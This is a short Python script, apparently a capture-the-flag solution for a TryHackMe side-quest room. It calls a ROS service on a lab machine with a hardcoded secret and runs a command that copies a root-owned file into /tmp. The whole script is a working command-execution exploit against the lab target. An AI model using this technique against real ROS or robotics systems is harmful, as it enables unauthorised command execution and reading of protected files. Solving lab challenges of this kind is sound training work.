# script used on tryhackme room https://tryhackme.com/r/room/adventofcyber24sidequest
# T2: Yin and Yang
# script to be run on  yang machine
# script generated wit help of Google Gemini

#!/usr/bin/env python3

import rospy
from yin.srv import yangrequest

def call_yang_service(secret, command):
    """
    Calls the svc_yang service on the Yin machine.

    Args:
        secret: The secret string required for authentication.
        command: The command to be executed on the Yin machine.

    Returns:
        The output of the command executed on the Yin machine.
    """
    rospy.init_node('exploit_client', anonymous=True)
    rospy.wait_for_service('svc_yang')
    try:
        svc_yang = rospy.ServiceProxy('svc_yang', yangrequest)
        response = svc_yang(secret, command, "Yang", "Yin")
        return response.response  # Access the correct attribute
    except rospy.ServiceException as e:
        print("Service call failed: %s" % e)

if __name__ == "__main__":
    # Replace with the actual secret and command
    secret = "thisisasecretvaluethatyouwillneverguess"
    command = "cat /root/yin.txt > /tmp/flag.txt"

    output = call_yang_service(secret, command)
    print(output)
